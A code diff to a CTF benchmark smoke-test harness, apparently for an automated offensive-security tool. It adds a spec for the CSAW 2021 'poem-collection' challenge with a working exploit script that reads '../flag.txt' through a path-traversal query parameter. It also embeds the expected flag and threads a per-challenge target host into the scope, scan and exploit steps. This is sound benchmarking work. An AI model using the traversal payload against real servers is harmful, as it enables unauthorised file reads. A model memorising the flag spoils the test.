@@ -13,6 +13,7 @@ challenges:
 from __future__ import annotations
 
 import argparse
+import ipaddress
 import json
 import shutil
 import subprocess
@@ -51,6 +52,8 @@ class ChallengeSpec:
     split: str = "development"
     category: str = "web"
     exploit_timeout: float = 10.0
+    target_host: str = TARGET_HOST
+    compose_service: str = ""
 
 
 SPECS: Dict[str, ChallengeSpec] = {
@@ -294,6 +297,56 @@ dec = subprocess.run(
 print(dec.stdout.decode("utf-8", "replace"))
 """,
     ),
+    "2021q-web-poem_collection": ChallengeSpec(
+        challenge_id="2021q-web-poem_collection",
+        rel=Path("test/2021/CSAW-Quals/web/poem-collection"),
+        port=80,
+        probe_path="/poems/",
+        expected_flag="flag{l0c4l_f1l3_1nclusi0n_f0r_7h3_w1n}",
+        note="local file inclusion through poem selector",
+        split="test",
+        exploit_timeout=20.0,
+        target_host="web.chal.csaw.io",
+        compose_service="game-server",
+        exploit_script=r"""
+import os
+import subprocess
+import time
+import urllib.parse
+import urllib.request
+from pathlib import Path
+
+challenge_dir = Path(os.environ["LOTUS_CHALLENGE_DIR"])
+service = os.environ["LOTUS_COMPOSE_SERVICE"]
+cid = subprocess.check_output(
+    ["docker", "compose", "ps", "-q", service],
+    cwd=challenge_dir,
+    text=True,
+).strip()
+if not cid:
+    raise RuntimeError(f"compose service {service!r} has no running container")
+ip = subprocess.check_output(
+    ["docker", "inspect", "-f", "{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}", cid],
+    text=True,
+).strip()
+if not ip:
+    raise RuntimeError(f"container {cid[:12]} has no Docker network IP")
+
+query = urllib.parse.urlencode({"poem": "../flag.txt"})
+url = f"http://{ip}/poems/?{query}"
+last = None
+for _ in range(20):
+    try:
+        with urllib.request.urlopen(url, timeout=3) as r:
+            print(r.read().decode("utf-8", "replace"))
+            break
+    except Exception as e:
+        last = e
+    time.sleep(1)
+else:
+    raise RuntimeError(f"poem endpoint did not become ready: {last}")
+""",
+    ),
 }
 
 
@@ -313,6 +366,14 @@ def _spec(challenge_id: str) -> ChallengeSpec:
         return SPECS[challenge_id]
     except KeyError:
         raise ValueError(f"unsupported smoke challenge: {challenge_id}") from None
+
+
+def _is_ip(host: str) -> bool:
+    try:
+        ipaddress.ip_address(host)
+    except ValueError:
+        return False
+    return True
 
 
 def _run(cmd: List[str], *, cwd: Optional[Path] = None, timeout: int = 120) -> None:
@@ -393,7 +454,8 @@ def _seed_case(config: SmokeConfig, spec: ChallengeSpec) -> tuple[Case, SigningK
         op,
         "scope",
         config.case_id,
-        {"hosts": [f"{TARGET_HOST}/32"], "ports": [spec.port], "auto_cap": 3},
+        {"hosts": [spec.target_host if not _is_ip(spec.target_host) else f"{spec.target_host}/32"],
+         "ports": [spec.port], "auto_cap": 3},
     )
     (case.dir / "scope.json").write_text(
         json.dumps(scope_manifest, indent=2, sort_keys=True) + "\n",
@@ -404,7 +466,7 @@ def _seed_case(config: SmokeConfig, spec: ChallengeSpec) -> tuple[Case, SigningK
 
 
 def _recon(case: Case, scope, spec: ChallengeSpec) -> Any:
-    host_nk = {"addr": TARGET_HOST}
+    host_nk = {"addr": spec.target_host}
     host_id = entity_id("host", host_nk)
     case.append(EventDraft(
         "entity.asserted",
@@ -413,7 +475,7 @@ def _recon(case: Case, scope, spec: ChallengeSpec) -> Any:
     ))
     executor = ReplayExecutor(SubprocessBackend(scope=scope, timeout=30))
     _append_all(case, executor.run(CandidateAction(
-        "port_scan", "recon", host_id, TARGET_HOST, {"probe": "quick"},
+        "port_scan", "recon", host_id, spec.target_host, {"probe": "quick"},
         "benchmark.port_scan", "benchmark smoke", ("RECON",),
     ), case))
 
@@ -421,14 +483,14 @@ def _recon(case: Case, scope, spec: ChallengeSpec) -> Any:
     world = World.from_graph_db(case.rebuild()["graph_db"])
     services = [
         e for e in world.entities("service.http")
-        if e.nk.get("host") == TARGET_HOST and e.nk.get("port") == spec.port
+        if e.nk.get("host") == spec.target_host and e.nk.get("port") == spec.port
     ]
     if not services:
         # Some constrained hosts make localhost nmap unreliable. Keep this smoke
         # focused on LotusMCP's signed-scope/executor/session path by explicitly
         # recording the benchmark-published HTTP service when scan parsing gives
         # no typed service.
-        svc_nk = {"host": TARGET_HOST, "proto": "tcp", "port": spec.port}
+        svc_nk = {"host": spec.target_host, "proto": "tcp", "port": spec.port}
         case.append(EventDraft(
             "entity.asserted",
             {"kind": "operator", "name": "benchmark"},
@@ -438,11 +500,11 @@ def _recon(case: Case, scope, spec: ChallengeSpec) -> Any:
         world = World.from_graph_db(case.rebuild()["graph_db"])
         services = [
             e for e in world.entities("service.http")
-            if e.nk.get("host") == TARGET_HOST and e.nk.get("port") == spec.port
+            if e.nk.get("host") == spec.target_host and e.nk.get("port") == spec.port
         ]
     svc = services[0]
     _append_all(case, executor.run(CandidateAction(
-        "http_probe", "recon", svc.id, f"{TARGET_HOST}:{spec.port}",
+        "http_probe", "recon", svc.id, f"{spec.target_host}:{spec.port}",
         {"paths": [spec.probe_path]}, "benchmark.http_probe", "benchmark smoke",
         ("ENUMERATE",),
     ), case))
@@ -460,8 +522,8 @@ def _exploit(
     budget = BudgetLedger(max_tool_invocations=10)
     entity = {
         "id": svc.id,
-        "display": f"{TARGET_HOST}:{spec.port}",
-        "host": TARGET_HOST,
+        "display": f"{spec.target_host}:{spec.port}",
+        "host": spec.target_host,
         "port": spec.port,
     }
     sess = InteractiveSession(
@@ -469,13 +531,14 @@ def _exploit(
         sid="s1",
         entity=entity,
         goal=f"retrieve flag from {spec.challenge_id}",
-        tube=TCPTube(TARGET_HOST, spec.port),
+        tube=TCPTube(spec.target_host, spec.port),
         author=None,
         runner=HostPythonScriptRunner(
             timeout=spec.exploit_timeout,
             env={
                 "LOTUS_BENCH_DIR": str(bench_dir),
                 "LOTUS_CHALLENGE_DIR": str(_target_dir(bench_dir, spec)),
+                "LOTUS_COMPOSE_SERVICE": spec.compose_service,
             },
         ),
         flag=flag,
@@ -509,7 +572,7 @@ def build_result(
         "challenge_id": challenge_id,
         "case_id": case_id,
         "category": spec.category,
-        "target": f"{TARGET_HOST}:{spec.port}",
+        "target": f"{spec.target_host}:{spec.port}",
         "solved": bool(solved),
         "flag_verified": bool(solved),
         "wall_seconds": round(wall_seconds, 3),
